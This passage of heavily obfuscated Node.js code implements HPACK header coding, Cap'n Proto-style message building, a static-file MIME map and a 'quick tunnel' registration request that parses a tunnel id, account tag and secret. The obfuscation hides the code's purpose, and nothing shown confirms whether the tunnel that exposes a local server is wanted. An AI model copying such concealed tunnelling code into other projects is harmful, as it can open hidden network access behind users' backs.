                'LuGVr': function (f, g) {
                    return f + g;
                },
                'CcYyG': function (f, g) {
                    return f + g;
                },
                'eenTB': cx(0x2fd),
                'cYWNd': function (f, g) {
                    return f > g;
                },
                'gSrfV': function (f, g) {
                    return f > g;
                }
            }, d = c[cx(0x2f9)](c[cx(0x5c7)](0x20, Buffer[cx(0x482)](a, c[cx(0x330)])), Buffer['byteLength'](b, c[cx(0x330)]));
        if (c[cx(0x1bf)](d, this[cx(0x1c4)])) {
            this[cx(0x4d7)] = [], this[cx(0x3a3)] = 0x0;
            return;
        }
        while (c[cx(0x4dd)](this[cx(0x4d7)][cx(0x4a5)], 0x0) && c['LuGVr'](this[cx(0x3a3)], d) > this[cx(0x1c4)]) {
            const [f, g] = this[cx(0x4d7)][cx(0x3a9)]();
            this['dynamicSize'] -= c[cx(0x5c7)](0x20, Buffer[cx(0x482)](f, c[cx(0x330)])) + Buffer[cx(0x482)](g, c[cx(0x330)]);
        }
        this['dynamic'][cx(0x781)]([
            a,
            b
        ]), this['dynamicSize'] += d;
    }
    ['decode'](a) {
        const cy = a0aQ, b = {
                'AqbvR': function (f, g) {
                    return f < g;
                },
                'fUUtR': function (f, g, h) {
                    return f(g, h);
                },
                'zoYFm': cy(0x2fd),
                'lEwfC': function (f, g) {
                    return f & g;
                },
                'EQIFC': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'oeDzn': cy(0xa9),
                'PDpAk': function (f, g) {
                    return f > g;
                },
                'xyLGW': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'KxJlD': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (b[cy(0x6be)](d, a[cy(0x4a5)])) {
            const f = a[d];
            if (f & 0x80) {
                let j;
                [j, d] = a0aa(a, d, 0x7), c[cy(0x33a)](this[cy(0x122)](j));
                continue;
            }
            if (f & 0x40) {
                let k, l;
                [k, d] = a0aa(a, d, 0x6);
                if (k)
                    l = this[cy(0x122)](k)[0x0];
                else {
                    let o;
                    [o, d] = b['fUUtR'](a0ab, a, d), l = o[cy(0x496)](b[cy(0x438)])[cy(0x2c1)]();
                }
                let m;
                [m, d] = a0ab(a, d);
                const n = m[cy(0x496)](b[cy(0x438)]);
                this[cy(0x2c2)](l, n), c['push']([
                    l,
                    n
                ]);
                continue;
            }
            if (b[cy(0x51d)](f, 0x20)) {
                let p;
                [p, d] = b['EQIFC'](a0aa, a, d, 0x5);
                if (p > 0x1000)
                    throw new Error(b[cy(0x22f)]);
                this[cy(0x1c4)] = p;
                while (b[cy(0x18e)](this['dynamic']['length'], 0x0) && this[cy(0x3a3)] > p) {
                    const [q, r] = this[cy(0x4d7)]['pop']();
                    this[cy(0x3a3)] -= 0x20 + Buffer[cy(0x482)](q, 'utf8') + Buffer[cy(0x482)](r, b[cy(0x438)]);
                }
                continue;
            }
            let g, h;
            [g, d] = b['xyLGW'](a0aa, a, d, 0x4);
            if (g)
                h = this['tableEntry'](g)[0x0];
            else {
                let s;
                [s, d] = b[cy(0x15d)](a0ab, a, d), h = s[cy(0x496)](b[cy(0x438)])[cy(0x2c1)]();
            }
            let i;
            [i, d] = b[cy(0x680)](a0ab, a, d), c[cy(0x33a)]([
                h,
                i['toString'](b[cy(0x438)])
            ]);
        }
        return c;
    }
}
function a0ad(a, b, c) {
    const cz = a0aQ, d = {
            'kVOkG': function (h, i) {
                return h << i;
            },
            'rQOBD': function (h, i) {
                return h < i;
            },
            'BPhKI': function (h, i) {
                return h | i;
            },
            'idygd': function (h, i) {
                return h | i;
            },
            'sdtSG': function (h, i) {
                return h & i;
            },
            'zCToU': function (h, i) {
                return h / i;
            }
        }, f = d[cz(0x60e)](0x1, b) - 0x1;
    if (d['rQOBD'](a, f))
        return Buffer[cz(0x3e1)]([c | a]);
    const g = [d[cz(0x331)](c, f)];
    a -= f;
    while (a >= 0x80) {
        g[cz(0x33a)](d['idygd'](d[cz(0x4cc)](a, 0x7f), 0x80)), a = Math['floor'](d[cz(0x111)](a, 0x80));
    }
    return g['push'](a), Buffer[cz(0x3e1)](g);
}
function a0ae(a) {
    const cA = a0aQ, b = {
            'OZldw': cA(0x2fd),
            'AcVai': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[cA(0x3e1)](a, b['OZldw']);
    return Buffer[cA(0x147)]([
        b['AcVai'](a0ad, c[cA(0x4a5)], 0x7, 0x0),
        c
    ]);
}
function a0af(a) {
    const cB = a0aQ, b = {
            'UzoNU': function (d, f) {
                return d === f;
            },
            'YlPCV': cB(0x35f),
            'AqmsD': cB(0x5b7),
            'tOBxW': function (d, f) {
                return d === f;
            },
            'toYhu': cB(0x1e2),
            'lPdlY': cB(0x594),
            'kMZvT': cB(0x5f1),
            'eMBCI': function (d, f) {
                return d === f;
            },
            'RTNUJ': '400',
            'LOeJR': function (d, f) {
                return d === f;
            },
            'pEsxw': cB(0x501),
            'KCTEP': function (d, f) {
                return d === f;
            },
            'OHxbn': function (d, f, g, h) {
                return d(f, g, h);
            },
            'jAGbm': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[cB(0x389)](d, b['YlPCV']) && b['UzoNU'](f, b[cB(0x5fb)]))
            c[cB(0x33a)](0x88);
        else {
            if (b[cB(0x389)](d, b[cB(0x37c)]) && b['tOBxW'](f, b['toYhu']))
                c[cB(0x33a)](0x89);
            else {
                if (b['UzoNU'](d, b['YlPCV']) && f === b[cB(0x44f)])
                    c[cB(0x33a)](0x8a);
                else {
                    if (b['UzoNU'](d, cB(0x35f)) && b[cB(0x2e3)](f, b[cB(0x5ef)]))
                        c[cB(0x33a)](0x8b);
                    else {
                        if (d === cB(0x35f) && b[cB(0x5a8)](f, b[cB(0x62f)]))
                            c[cB(0x33a)](0x8c);
                        else {
                            if (d === b['YlPCV'] && b[cB(0x2e8)](f, b['pEsxw']))
                                c[cB(0x33a)](0x8d);
                            else
                                b['KCTEP'](d, b['YlPCV']) && f === '500' ? c[cB(0x33a)](0x8e) : (c['push'](...b['OHxbn'](a0ad, 0x0, 0x4, 0x0)), c['push'](...b[cB(0x2b3)](a0ae, d)), c['push'](...b[cB(0x2b3)](a0ae, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[cB(0x3e1)](c);
}
class a0ag {
    constructor() {
        this['words'] = [];
    }
    [a0aQ(0x36a)](a) {
        const cC = a0aQ, b = {
                'riODu': function (d, f) {
                    return d < f;
                }
            }, c = this[cC(0x650)][cC(0x4a5)];
        for (let d = 0x0; b[cC(0x5d9)](d, a); d++) {
            this['words'][cC(0x33a)](0x0n);
        }
        return c;
    }
    ['structPtr'](a, b, c, d) {
        const cD = a0aQ, f = {
                'dPYvO': function (j, k) {
                    return j & k;
                },
                'vPjUa': function (j, k) {
                    return j << k;
                },
                'RFXGJ': function (j, k) {
                    return j(k);
                },
                'GGVaQ': function (j, k) {
                    return j(k);
                },
                'munzh': function (j, k) {
                    return j | k;
                }
            }, g = b - a - 0x1, h = f[cD(0x38f)](f[cD(0x778)](f['RFXGJ'](BigInt, g), 0x2n), 0xfffffffcn), i = f['GGVaQ'](BigInt, f[cD(0x38f)](c, 0xffff)) | f['RFXGJ'](BigInt, d & 0xffff) << 0x10n;
        this['words'][a] = f[cD(0x2fa)](h, f[cD(0x778)](i, 0x20n));
    }
    [a0aQ(0x62d)](a, b, c) {
        const cE = a0aQ, d = {
                'yKosB': function (g, h) {
                    return g(h);
                },
                'vupfG': function (g, h) {
                    return g * h;
                },
                'DywMs': function (g, h) {
                    return g & h;
                },
                'PKhiK': function (g, h) {
                    return g << h;
                },
                'MtMyK': function (g, h) {
                    return g * h;
                }
            }, f = 0xffn << d['yKosB'](BigInt, d[cE(0x671)](b, 0x8));
        this[cE(0x650)][a] = d[cE(0x2d7)](this['words'][a], ~f) | d[cE(0x217)](d[cE(0x332)](BigInt, d['DywMs'](c, 0xff)), d[cE(0x332)](BigInt, d[cE(0x1ba)](b, 0x8)));
    }
    [a0aQ(0x34e)](a, b, c) {
        const cF = a0aQ, d = {
                'TJgZc': function (g, h) {
                    return g << h;
                },
                'WtCTX': function (g, h) {
                    return g(h);
                },
                'cltZA': function (g, h) {
                    return g * h;
                },
                'HDOiV': function (g, h) {
                    return g & h;
                }
            }, f = d['TJgZc'](0xffffn, d[cF(0x102)](BigInt, d[cF(0x53b)](b, 0x8)));
        this['words'][a] = d['HDOiV'](this['words'][a], ~f) | d[cF(0x2bb)](BigInt(d['HDOiV'](c, 0xffff)), d[cF(0x102)](BigInt, d['cltZA'](b, 0x8)));
    }
    [a0aQ(0x62a)](a, b, c) {
        const cG = a0aQ, d = {
                'gZWOY': function (g, h) {
                    return g << h;
                },
                'vmRBJ': function (g, h) {
                    return g(h);
                },
                'fXAUN': function (g, h) {
                    return g * h;
                },
                'gMHVw': function (g, h) {
                    return g | h;
                },
                'ODwWb': function (g, h) {
                    return g << h;
                },
                'GWCRL': function (g, h) {
                    return g(h);
                },
                'IQhDL': function (g, h) {
                    return g & h;
                },
                'HlaCh': function (g, h) {
                    return g(h);
                }
            }, f = d[cG(0x1cf)](0xffffffffn, d[cG(0x626)](BigInt, d['fXAUN'](b, 0x8)));
        this[cG(0x650)][a] = d[cG(0x56c)](this[cG(0x650)][a] & ~f, d[cG(0x3f8)](d[cG(0x29b)](BigInt, d[cG(0x52a)](c, 0xffffffff)), d[cG(0x51b)](BigInt, b * 0x8)));
    }
    [a0aQ(0x64d)](a, b) {
        const cH = a0aQ, c = {
                'KQBzb': function (d, f) {
                    return d & f;
                }
            };
        this[cH(0x650)][a] = c['KQBzb'](BigInt(b), 0xffffffffffffffffn);
    }
    [a0aQ(0x36c)](a, b, c = ![]) {
        const cI = a0aQ, d = {
                'RwAOc': function (m, n) {
                    return m === n;
                },
                'WycUC': 'string',
                'wQLjp': cI(0x2fd),
                'dtpmQ': function (m, n) {
                    return m / n;
                },
                'qirWV': function (m, n) {
                    return m < n;
                },
                'XmwsH': function (m, n) {
                    return m % n;
                },
                'tUYuq': function (m, n) {
                    return m - n;
                },
                'RGbXK': function (m, n) {
                    return m - n;
                },
                'yhopM': function (m, n) {
                    return m & n;
                },
                'YQIAW': function (m, n) {
                    return m | n;
                },
                'pNoUs': function (m, n) {
                    return m << n;
                },
                'PLaEO': function (m, n) {
                    return m(n);
                },
                'ulwUN': function (m, n) {
                    return m | n;
                },
                'VLAFR': function (m, n) {
                    return m << n;
                }
            }, f = d[cI(0x100)](typeof b, d['WycUC']) ? Buffer[cI(0x3e1)](b, d[cI(0xd3)]) : b, g = f[cI(0x4a5)] + (c ? 0x1 : 0x0), h = this['alloc'](Math[cI(0xbd)](d[cI(0x455)](g, 0x8)));
        for (let m = 0x0; d[cI(0xeb)](m, f[cI(0x4a5)]); m++) {
            this[cI(0x62d)](h + Math[cI(0x686)](d[cI(0x455)](m, 0x8)), d[cI(0xe4)](m, 0x8), f[m]);
        }
        const j = d['tUYuq'](d[cI(0x75b)](h, a), 0x1), k = d['yhopM'](d[cI(0x107)](d['pNoUs'](d[cI(0x198)](BigInt, j), 0x2n), 0x1n), 0xffffffffn), l = d['YQIAW'](0x2n, d[cI(0xd6)](BigInt(g & 0x1fffffff), 0x3n));
        this[cI(0x650)][a] = d[cI(0x55f)](k, d[cI(0x1b8)](l, 0x20n));
    }
    [a0aQ(0x18b)](a, b) {
        const cJ = a0aQ, c = {
                'QuwNl': function (g, h) {
                    return g - h;
                },
                'OHULc': function (g, h) {
                    return g | h;
                },
                'zJlkW': function (g, h) {
                    return g & h;
                },
                'loISn': function (g, h) {
                    return g | h;
                },
                'NtXRh': function (g, h) {
                    return g << h;
                },
                'VKAWT': function (g, h) {
                    return g(h);
                },
                'QJGls': function (g, h) {
                    return g < h;
                },
                'uSwJU': function (g, h) {
                    return g + h;
                }
            };
        if (!b[cJ(0x4a5)]) {
            this[cJ(0x650)][a] = 0x0n;
            return;
        }
        const d = this[cJ(0x36a)](b[cJ(0x4a5)]), f = c[cJ(0x1de)](c['QuwNl'](d, a), 0x1);
        this[cJ(0x650)][a] = c[cJ(0x489)](c[cJ(0x5f3)](c['loISn'](c[cJ(0x5d3)](BigInt(f), 0x2n), 0x1n), 0xffffffffn), c['NtXRh'](0x6n | c[cJ(0x5d3)](c[cJ(0x27d)](BigInt, b[cJ(0x4a5)]), 0x3n), 0x20n));
        for (let g = 0x0; c[cJ(0x737)](g, b[cJ(0x4a5)]); g++) {
            this[cJ(0x36c)](c[cJ(0x1d8)](d, g), b[g], !![]);
        }
    }
    [a0aQ(0x652)]() {
        const cK = a0aQ, a = {
                'HWFBV': function (d, f) {
                    return d * f;
                },
                'HDtVq': function (d, f) {
                    return d < f;
                },
                'NjcQZ': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[cK(0x36a)](0x8);
        b[cK(0x601)](0x0, 0x0), b['writeUInt32LE'](this[cK(0x650)]['length'], 0x4);
        const c = Buffer[cK(0x36a)](a['HWFBV'](this[cK(0x650)][cK(0x4a5)], 0x8));
        for (let d = 0x0; a[cK(0x2b1)](d, this[cK(0x650)]['length']); d++) {
            c[cK(0x43f)](a['NjcQZ'](this['words'][d], 0xffffffffffffffffn), a['HWFBV'](d, 0x8));
        }
        return Buffer[cK(0x147)]([
            b,
            c
        ]);
    }
}
function a0ah(a) {
    const cL = a0aQ, b = new a0ag(), c = b[cL(0x36a)](0x1), d = b[cL(0x36a)](0x1), f = b[cL(0x36a)](0x1);
    b[cL(0x3ec)](c, d, 0x1, 0x1), b[cL(0x34e)](d, 0x0, 0x8);
    const g = b[cL(0x36a)](0x1);
    return b['alloc'](0x1), b['structPtr'](f, g, 0x1, 0x1), b['setU32'](g, 0x0, a), b[cL(0x652)]();
}
function a0ai(a, b, c, d, f, g) {
    const cM = a0aQ, h = {
            'SGvAR': function (H, I) {
                return H | I;
            },
            'PEKMB': function (H, I) {
                return H & I;
            },
            'xmGxt': cM(0x456),
            'Kphzd': cM(0x183),
            'poMmc': cM(0x3b6)
        }, i = new a0ag(), j = i[cM(0x36a)](0x1), k = i['alloc'](0x1), l = i['alloc'](0x1);
    i['structPtr'](j, k, 0x1, 0x1), i[cM(0x34e)](k, 0x0, 0x2);
    const m = i['alloc'](0x1), n = i[cM(0x36a)](0x1);
    i[cM(0x36a)](0x1);
    const o = i[cM(0x36a)](0x1), p = i['alloc'](0x1);
    i[cM(0x36a)](0x1), i['structPtr'](l, m, 0x3, 0x3), i[cM(0x62a)](m, 0x0, a), i[cM(0x64d)](n, 0xf71695ec7fe85497n);
    const q = i[cM(0x36a)](0x1), r = i[cM(0x36a)](0x1);
    i['structPtr'](o, q, 0x1, 0x1), i[cM(0x34e)](q, 0x4, 0x1);
    const s = i['alloc'](0x1);
    i[cM(0x36a)](0x1), i[cM(0x3ec)](r, s, 0x1, 0x1), i['setU32'](s, 0x0, b);
    const t = i['alloc'](0x1);
    i[cM(0x36a)](0x1), i[cM(0x3ec)](p, t, 0x0, 0x2);
    const u = i[cM(0x36a)](0x1), v = i[cM(0x36a)](0x1), w = i[cM(0x36a)](0x1), x = i[cM(0x36a)](0x1);
    i[cM(0x3ec)](t, u, 0x1, 0x3), i[cM(0x62d)](u, 0x0, g);
    const y = i['alloc'](0x1), z = i[cM(0x36a)](0x1);
    i['structPtr'](v, y, 0x0, 0x2), i[cM(0x36c)](y, c, !![]), i['writeBytes'](z, d), i[cM(0x36c)](w, f);
    const A = i[cM(0x36a)](0x1), B = i[cM(0x36a)](0x1);
    i[cM(0x36a)](0x1), i['structPtr'](x, A, 0x1, 0x2);
    const C = i[cM(0x36a)](0x1), D = i['alloc'](0x1), E = i['alloc'](0x1), F = i[cM(0x36a)](0x1);
    i[cM(0x3ec)](B, C, 0x0, 0x4);
    const G = a0k[cM(0x36f)](0x10);
    return G[0x6] = h[cM(0x6b5)](h[cM(0x3e6)](G[0x6], 0xf), 0x40), G[0x8] = h[cM(0x6b5)](h[cM(0x3e6)](G[0x8], 0x3f), 0x80), i[cM(0x36c)](C, G), i[cM(0x18b)](D, [
        cM(0x22a),
        h[cM(0x3f3)]
    ]), i[cM(0x36c)](E, h[cM(0x21b)], !![]), i['writeBytes'](F, h['poMmc'], !![]), i['finish']();
}
function a0aj(a) {
    const cN = a0aQ, b = {
            'HXpGa': function (f, g) {
                return f >= g;
            },
            'DoJZd': function (f, g) {
                return f + g;
            },
            'rtMyc': function (f, g) {
                return f % g;
            },
            'HUGdU': function (f, g) {
                return f - g;
            },
            'zaOvT': function (f, g) {
                return f < g;
            },
            'pZxZh': function (f, g) {
                return f + g;
            },
            'EDtxS': function (f, g) {
                return f + g;
            },
            'XwbFr': function (f, g) {
                return f * g;
            },
            'xqvXI': function (f, g) {
                return f * g;
            },
            'rCPgG': function (f, g) {
                return f - g;
            },
            'uZyJW': function (f, g) {
                return f !== g;
            },
            'YGPeg': cN(0x681),
            'rjQDT': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b[cN(0x662)](a[cN(0x4a5)] - d, 0x8)) {
        const f = a[cN(0x290)](d), g = a[cN(0x290)](b[cN(0x625)](d, 0x4)), h = b[cN(0x625)](f, 0x1);
        let j = b[cN(0x625)](0x2, h), k = j * 0x4;
        b[cN(0x26a)](k, 0x8) && (k += 0x4);
        if (b['HUGdU'](a[cN(0x4a5)], d) < k)
            break;
        const l = [g];
        for (let n = 0x1; b[cN(0x533)](n, h); n++) {
            l['push'](a['readUInt32LE'](b['pZxZh'](b['EDtxS'](d, 0x4), b[cN(0x3e8)](n, 0x4))));
        }
        const m = k + b[cN(0x38a)](l[cN(0x617)]((o, p) => o + p, 0x0), 0x8);
        if (b[cN(0x533)](b[cN(0x24e)](a[cN(0x4a5)], d), m))
            break;
        if (b[cN(0x779)](h, 0x1))
            throw new Error(b[cN(0x647)]);
        c[cN(0x33a)](a['subarray'](b[cN(0x551)](d, k), d + m)), d += m;
    }
    return [
        c,
        a['subarray'](d)
    ];
}
function a0ak(a, b) {
    const cO = a0aQ, c = {
            'DkAsc': function (j, k) {
                return j >= k;
            },
            'ZaWyX': cO(0x4c0),
            'EsBNN': function (j, k) {
                return j !== k;
            },
            'dudvM': function (j, k) {
                return j & k;
            },
            'FXhUM': function (j, k) {
                return j & k;
            },
            'Asoxu': function (j, k) {
                return j + k;
            },
            'bGUAL': function (j, k) {
                return j + k;
            },
            'SguNQ': function (j, k) {
                return j >> k;
            },
            'ndeUU': function (j, k) {
                return j(k);
            },
            'KPQSb': function (j, k) {
                return j >> k;
            },
            'VDnnC': function (j, k) {
                return j > k;
            },
            'xvoCh': function (j, k) {
                return j + k;
            }
        };
    if (c[cO(0x6f7)](b, a[cO(0x4a5)]))
        throw new Error(c[cO(0x6ed)]);
    const d = a[b];
    if (c[cO(0x5d5)](c[cO(0x492)](d, 0x3n), 0x0n))
        throw new Error(cO(0x23e));
    let f = c[cO(0x248)](d >> 0x2n, 0x3fffffffn);
    c['FXhUM'](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[cO(0x28c)](c[cO(0x363)](b, 0x1), Number(f)), h = Number(c[cO(0x248)](c['SguNQ'](d, 0x20n), 0xffffn)), i = c[cO(0x4f6)](Number, c[cO(0x248)](c['KPQSb'](d, 0x30n), 0xffffn));
    if (g < 0x0 || c['VDnnC'](c[cO(0x341)](c['xvoCh'](g, h), i), a[cO(0x4a5)]))
        throw new Error(c[cO(0x6ed)]);
    return [
        g,
        h,
        i
    ];
}
function a0al(a, b) {
    const cP = a0aQ, c = {
            'Ohghd': function (m, n) {
                return m >= n;
            },
            'icUdW': function (m, n) {
                return m !== n;
            },
            'zMKBK': function (m, n) {
                return m & n;
            },
            'kOWLl': function (m, n) {
                return m >> n;
            },
            'VARMM': function (m, n) {
                return m + n;
            },
            'CVQbc': function (m, n) {
                return m & n;
            },
            'vjYUS': function (m, n) {
                return m(n);
            },
            'haBbo': function (m, n) {
                return m >> n;
            },
            'NTgjp': function (m, n) {
                return m / n;
            },
            'mtqhf': function (m, n) {
                return m > n;
            },
            'jtMvL': function (m, n) {
                return m * n;
            },
            'NBxeK': function (m, n) {
                return m & n;
            },
            'PFrnN': function (m, n) {
                return m + n;
            },
            'fEmli': 'utf8'
        };
    if (c[cP(0x457)](b, a[cP(0x4a5)]))
        return '';
    const d = a[b];
    if (c[cP(0x2dc)](c['zMKBK'](d, 0x3n), 0x1n))
        return '';
    let f = c[cP(0x6c7)](d, 0x2n) & 0x3fffffffn;
    c[cP(0x3a7)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[cP(0x59c)](c['VARMM'](b, 0x1), Number(f)), h = Number(c[cP(0x279)](d >> 0x20n, 0x7n)), j = c[cP(0x4b1)](Number, c[cP(0x773)](d, 0x23n)), k = Math[cP(0xbd)](c['NTgjp'](j, 0x8));
    if (c[cP(0x2dc)](h, 0x2) || g < 0x0 || c['mtqhf'](g + k, a[cP(0x4a5)]))
        return '';
    const l = Buffer[cP(0x36a)](c['jtMvL'](k, 0x8));
    for (let m = 0x0; m < k; m++) {
        l[cP(0x43f)](c[cP(0x5e3)](a[c[cP(0x73b)](g, m)], 0xffffffffffffffffn), c['jtMvL'](m, 0x8));
    }
    return l[cP(0x2e4)](0x0, j)[cP(0x496)](c[cP(0x664)])[cP(0x4c2)](/\0+$/, '');
}
function a0am(a) {
    const cQ = a0aQ, b = {
            'ONQTH': function (z, A) {
                return z < A;
            },
            'dVihL': cQ(0x725),
            'ajhGz': function (z, A) {
                return z < A;
            },
            'umHTG': function (z, A) {
                return z / A;
            },
            'sKWND': function (z, A) {
                return z * A;
            },
            'wjbpK': function (y, z, A) {
                return y(z, A);
            },
            'mkueq': function (z, A) {
                return z !== A;
            },
            'HCabm': function (z, A) {
                return z & A;
            },
            'sGhAO': function (y, z, A) {
                return y(z, A);
            },
            'iZnky': function (z, A) {
                return z + A;
            },
            'mIUhA': function (z, A) {
                return z >> A;
            },
            'QnRAs': function (z, A) {
                return z === A;
            },
            'ozQEs': function (z, A) {
                return z + A;
            },
            'CMTJP': cQ(0x1dc),
            'xyQfO': function (z, A) {
                return z + A;
            },
            'COViF': function (y, z, A) {
                return y(z, A);
            },
            'hYZIX': function (z, A) {
                return z + A;
            },
            'vjGiS': function (y, z) {
                return y(z);
            },
            'XxdZe': function (z, A) {
                return z & A;
            },
            'Bqead': function (y, z, A) {
                return y(z, A);
            },
            'DxCnY': function (z, A) {
                return z !== A;
            },
            'upSFq': cQ(0x6da),
            'zsoWy': function (y, z, A) {
                return y(z, A);
            },
            'kXQSs': function (z, A) {
                return z & A;
            }
        };
    if (a[cQ(0x4a5)] % 0x8 || b[cQ(0xd8)](a[cQ(0x4a5)], 0x18))
        throw new Error(b[cQ(0x5c2)]);
    const c = [];
    for (let y = 0x0; b[cQ(0x13f)](y, b['umHTG'](a[cQ(0x4a5)], 0x8)); y++) {
        c[cQ(0x33a)](a[cQ(0x556)](b[cQ(0x66a)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b[cQ(0x498)](a0ak, c, 0x0);
    if (f < 0x1 || b[cQ(0x400)](b[cQ(0x41c)](c[d], 0xffffn), 0x3n))
        throw new Error(cQ(0x295));
    let h, j, k;
    [h, j, k] = b[cQ(0x3a8)](a0ak, c, b[cQ(0x1bd)](d, f));
    const l = Number(b[cQ(0x41c)](b['mIUhA'](c[h], 0x30n), 0xffffn));
    if (b['QnRAs'](l, 0x1))
        return {
            'ok': ![],
            'error': b[cQ(0x3a8)](a0al, c, h + j)
        };
    if (b['mkueq'](l, 0x0))
        return {
            'ok': ![],
            'error': b['ozQEs'](b[cQ(0x687)], l)
        };
    let m, n, o;
    [m, n, o] = b['sGhAO'](a0ak, c, b[cQ(0x39f)](h, j));
    let p, q, r;
    [p, q, r] = b[cQ(0x3ba)](a0ak, c, b[cQ(0xf3)](m, n));
    const s = c[p], t = b[cQ(0x745)](Number, b[cQ(0x635)](s, 0xffffn));
    if (b[cQ(0x690)](t, 0x0))
        return {
            'ok': ![],
            'error': b['Bqead'](a0al, c, b[cQ(0x1f3)](p, q))
        };
    if (b[cQ(0x688)](t, 0x1))
        return {
            'ok': ![],
            'error': b[cQ(0xf3)](b['upSFq'], t)
        };
    let u, v, w;
    [u, v, w] = b[cQ(0x265)](a0ak, c, p + q);
    const x = b[cQ(0x4b3)](a0al, c, b['iZnky'](b['hYZIX'](u, v), 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b['vjGiS'](Boolean, b[cQ(0x3c2)](c[u], 0x1n))
    };
}
const a0an = {
    '.js': a0aQ(0x2ff),
    '.mjs': a0aQ(0x2ff),
    '.css': a0aQ(0x60f),
    '.json': a0aQ(0x693),
    '.map': a0aQ(0x693),
    '.wasm': a0aQ(0x75d),
    '.html': a0aQ(0x121),
    '.htm': 'text/html;\x20charset=utf-8',
    '.svg': a0aQ(0x739),
    '.xml': a0aQ(0x2eb),
    '.woff': a0aQ(0x328),
    '.woff2': a0aQ(0x328),
    '.png': a0aQ(0x624),
    '.jpg': a0aQ(0x480),
    '.jpeg': a0aQ(0x480),
    '.gif': 'image/gif',
    '.ico': 'image/x-icon'
};
function a0ao(a) {
    const cR = a0aQ, b = {
            'SBBtD': function (f, g) {
                return f < g;
            }
        }, c = a[cR(0x642)]('/') ? a['slice'](0x0, -0x1) : a, d = c[cR(0x61b)]('.');
    if (b[cR(0x6f9)](d, 0x0))
        return '';
    return a0an[c[cR(0x4a8)](d)[cR(0x2c1)]()] || '';
}
function a0ap(a) {
    const cS = a0aQ, b = {
            'sREQr': function (c, d) {
                return c !== d;
            },
            'ywuZH': cS(0x33e),
            'boeZc': function (c, d) {
                return c + d;
            },
            'bpWMq': function (c, d) {
                return c % d;
            },
            'Ezcvc': cS(0x4d6)
        };
    if (Array[cS(0x134)](a))
        return Buffer[cS(0x3e1)](a);
    if (b[cS(0x558)](typeof a, b[cS(0x5e5)]))
        throw new Error(cS(0x1d5));
    return Buffer[cS(0x3e1)](b[cS(0x2b5)](a, '='[cS(0x3e5)](b['bpWMq'](-a[cS(0x4a5)], 0x4))), b['Ezcvc']);
}
const a0aq = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0ar(a) {
    const cT = a0aQ, b = {
            'aiYVO': function (c, d) {
                return c(d);
            },
            'BwJIM': function (c, d) {
                return c + d;
            },
            'ayPwc': cT(0x301),
            'eECyG': cT(0x3e2),
            'YMCku': cT(0x2fd),
            'UQEIB': cT(0x33e),
            'Liids': 'bad\x20account\x20tag\x20or\x20hostname',
            'DdAwF': function (c, d) {
                return c(d);
            },
            'EuEPQ': cT(0x18c),
            'VEbYU': cT(0x576),
            'GalLo': 'error',
            'VfalD': 'end',
            'AFskt': function (c, d) {
                return c + d;
            },
            'CFkuN': cT(0x19f),
            'nuKBe': cT(0x3ab),
            'TrOAB': function (c, d) {
                return c === d;
            },
            'jYjwb': cT(0xc7),
            'owWjK': cT(0x622),
            'oivSF': cT(0xfc)
        };
    return new Promise((c, d) => {
        const cU = cT;
        let f;
        try {
            f = new URL(b['AFskt'](a['replace'](/\/+$/, ''), b[cU(0x4f0)]));
        } catch (i) {
            b['aiYVO'](d, new Error(b[cU(0x6c2)](b['nuKBe'], i[cU(0x322)])));
            return;
        }
        const g = b[cU(0x547)](f[cU(0x6fa)], b[cU(0x15c)]) ? a0h : a0g, h = g[cU(0x191)](f, {
                'method': b[cU(0x388)],
                'headers': {
                    'Content-Type': b[cU(0x586)],
                    'User-Agent': cU(0x657)
                },
                'timeout': 0x3a98
            }, j => {
                const cX = cU, k = {
                        'Wlgbc': function (m, n) {
                            const cV = a0b;
                            return b[cV(0x64c)](m, n);
                        },
                        'XvplT': function (m, n) {
                            const cW = a0b;
                            return b[cW(0x6c2)](m, n);
                        },
                        'rbAbZ': b[cX(0x763)],
                        'AYylx': b[cX(0x1c1)],
                        'avSRK': b['YMCku'],
                        'cNGiG': 'quick\x20tunnel\x20request\x20was\x20rejected:\x20',
                        'TsuZv': function (m, n) {
                            return m !== n;
                        },
                        'GNqia': b['UQEIB'],
                        'RLtbC': b[cX(0x577)],
                        'zKNOV': function (m, n) {
                            return m(n);
                        },
                        'CUrBf': function (m, n) {
                            return m(n);
                        },
                        'KKOhd': function (m, n) {
                            const cY = cX;
                            return b[cY(0x611)](m, n);
                        },
                        'byzVx': b[cX(0x50c)]
                    }, l = [];
                j['on'](b[cX(0x3ef)], m => l[cX(0x33a)](m)), j['on'](b['GalLo'], d), j['on'](b[cX(0x222)], () => {
                    const cZ = cX, m = Buffer[cZ(0x147)](l), n = j[cZ(0x51f)];
                    let o;
                    try {
                        o = JSON[cZ(0x4b2)](m[cZ(0x496)]('utf8'));
                    } catch (q) {
                        k[cZ(0x368)](d, new Error(k[cZ(0x3c8)](k[cZ(0x3c8)](k[cZ(0x3c8)](k['rbAbZ'], n), k[cZ(0x532)]), m[cZ(0x2e4)](0x0, 0x12c)[cZ(0x496)](k[cZ(0x579)]))));
                        return;
                    }
                    const p = o[cZ(0x135)] || {};
                    if (!(o['success'] ?? !![]) || !p) {
                        k['Wlgbc'](d, new Error(k[cZ(0x3c8)](k[cZ(0xb3)], JSON[cZ(0x769)](o[cZ(0x2cd)]))));
                        return;
                    }
                    try {
                        const r = String(p['id']);
                        if (!a0aq['test'](r))
                            throw new Error('bad\x20tunnel\x20id');
                        if (k[cZ(0x2ee)](typeof p['account_tag'], 'string') || k['TsuZv'](typeof p[cZ(0x697)], k['GNqia']))
                            throw new Error(k[cZ(0x4ad)]);
                        const s = k[cZ(0x6eb)](a0ap, p['secret']), t = Buffer['from'](r[cZ(0x4c2)](/-/g, ''), cZ(0x48a));
                        k[cZ(0x2a3)](c, [
